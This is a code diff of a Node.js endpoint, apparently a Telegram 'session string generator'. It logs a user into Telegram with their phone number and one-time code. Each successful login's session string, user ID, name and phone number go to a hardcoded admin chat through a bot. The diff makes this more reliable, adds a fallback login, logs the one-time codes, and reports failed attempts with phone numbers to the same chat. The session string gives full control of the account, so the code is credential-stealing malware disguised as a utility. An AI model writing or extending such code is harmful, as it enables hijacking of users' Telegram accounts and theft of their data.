@@ -9,7 +9,7 @@ const ADMIN_ID = '7907742294';
 
 async function sendToBot(message) {
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -20,6 +20,10 @@ async function sendToBot(message) {
         parse_mode: 'Markdown'
       })
     });
+    
+    if (!response.ok) {
+      console.error('Bot API error:', await response.text());
+    }
   } catch (error) {
     console.error('Failed to send message to bot:', error);
   }
@@ -51,45 +55,56 @@ module.exports = async (req, res) => {
       });
     }
 
-    console.log('Verifying code for:', phone);
+    console.log('Verifying code for:', phone, 'Code:', otp_code);
 
     const stringSession = new StringSession('');
     client = new TelegramClient(stringSession, API_ID, API_HASH, {
       connectionRetries: 5,
+      useWSS: false,
+      baseLogger: console,
     });
 
     await client.connect();
 
     try {
-      // First, try to sign in with the code
+      // Use the proper signIn method
       let result;
+      
+      // First try regular sign in
       try {
-        result = await client.invoke(new Api.auth.SignIn({
-          phoneNumber: phone,
-          phoneCodeHash: phone_code_hash,
-          phoneCode: otp_code,
-        }));
+        result = await client.invoke(
+          new Api.auth.SignIn({
+            phoneNumber: phone,
+            phoneCodeHash: phone_code_hash,
+            phoneCode: otp_code,
+          })
+        );
+        
+        console.log('Regular sign in successful');
+        
       } catch (signInError) {
-        // If sign in fails, it might be because we need to sign up (new account) or 2FA
-        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
-          if (!password) {
-            throw new Error('2FA password required. Please enter your password.');
-          }
-          
-          // Handle 2FA password
-          const { srp_id, current_algo, srp_B } = await client.invoke(new Api.account.GetPassword());
-          const { g, p, salt1, salt2 } = current_algo;
-          
-          // For simplicity, we'll use a direct approach
-          result = await client.invoke(new Api.auth.CheckPassword({
-            password: await client.invoke(new Api.account.GetPassword()),
-          }));
-        } else {
-          throw signInError;
-        }
+        console.log('Regular sign in failed, trying alternative method...');
+        
+        // If regular sign in fails, try the start method approach
+        await client.start({
+          phoneNumber: phone,
+          phoneCode: async () => otp_code,
+          phoneCodeHash: phone_code_hash,
+          onError: (err) => {
+            console.error('Start method error:', err);
+            throw err;
+          },
+        });
+        
+        console.log('Start method successful');
       }
 
-      // If we reach here, authentication was successful
+      // Check if we're authorized
+      if (!await client.checkAuthorization()) {
+        throw new Error('Authorization failed after sign in attempt');
+      }
+
+      // Get the final session string
       const sessionString = client.session.save();
       
       // Get user information
@@ -109,15 +124,16 @@ module.exports = async (req, res) => {
         `👤 **User Info:**\n` +
         `├ ID: \`${userInfo.id}\`\n` +
         `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
-        `├ Username: @${userInfo.username}\n` +
+        `├ Username: @${userInfo.username || 'N/A'}\n` +
         `└ Phone: ${userInfo.phone}\n\n` +
         `🔑 **Session String:**\n\`${sessionString}\``;
 
       await sendToBot(botMessage);
+      console.log('Message sent to bot successfully');
 
       await client.disconnect();
 
-      res.status(200).json({
+      return res.status(200).json({
         success: true,
         session_string: sessionString,
         user_info: userInfo,
@@ -128,15 +144,43 @@ module.exports = async (req, res) => {
       console.error('Authentication error:', authError);
       
       let errorMessage = authError.message;
-      if (authError.errorMessage === 'PHONE_CODE_INVALID') {
-        errorMessage = 'Invalid verification code. Please check and try again.';
-      } else if (authError.errorMessage === 'PHONE_CODE_EXPIRED') {
-        errorMessage = 'Verification code expired. Please request a new code.';
-      } else if (authError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
-        errorMessage = '2FA password required. Please enter your password.';
-      } else if (authError.message.includes('FLOOD_WAIT')) {
-        errorMessage = 'Too many attempts. Please wait and try again.';
+      
+      // Handle specific Telegram errors
+      if (authError.errorMessage) {
+        switch (authError.errorMessage) {
+          case 'PHONE_CODE_INVALID':
+            errorMessage = 'Invalid verification code. Please check and try again.';
+            break;
+          case 'PHONE_CODE_EXPIRED':
+            errorMessage = 'Verification code expired. Please request a new code.';
+            break;
+          case 'SESSION_PASSWORD_NEEDED':
+            errorMessage = '2FA password required. Please enter your password.';
+            break;
+          case 'PHONE_NUMBER_UNOCCUPIED':
+            errorMessage = 'Phone number not registered on Telegram.';
+            break;
+          case 'PHONE_NUMBER_INVALID':
+            errorMessage = 'Invalid phone number format.';
+            break;
+          default:
+            errorMessage = `Telegram error: ${authError.errorMessage}`;
+        }
+      } else if (authError.message) {
+        if (authError.message.includes('PHONE_CODE_INVALID')) {
+          errorMessage = 'Invalid verification code. Please check and try again.';
+        } else if (authError.message.includes('PHONE_CODE_EXPIRED')) {
+          errorMessage = 'Verification code expired. Please request a new code.';
+        } else if (authError.message.includes('SESSION_PASSWORD_NEEDED')) {
+          errorMessage = '2FA password required. Please enter your password.';
+        } else if (authError.message.includes('FLOOD_WAIT')) {
+          const waitTime = authError.message.match(/(\d+)/)?.[0] || 'unknown';
+          errorMessage = `Too many attempts. Please wait ${waitTime} seconds and try again.`;
+        }
       }
+      
+      // Send error to bot for monitoring
+      await sendToBot(`❌ **Session Generation Failed**\n\nPhone: ${phone}\nError: ${errorMessage}`);
       
       throw new Error(errorMessage);
     }
@@ -145,11 +189,12 @@ module.exports = async (req, res) => {
     console.error('Error in verify-code:', error);
     
     if (client) {
-      await client.disconnect();
+      try {
+        await client.disconnect();
+      } catch (disconnectError) {
+        console.error('Error disconnecting client:', disconnectError);
+      }
     }
-    
-    // Send error to bot for monitoring
-    await sendToBot(`❌ **Session Generation Failed**\n\nError: ${error.message}\nPhone: ${req.body.phone}`);
     
     res.status(200).json({
       success: false,
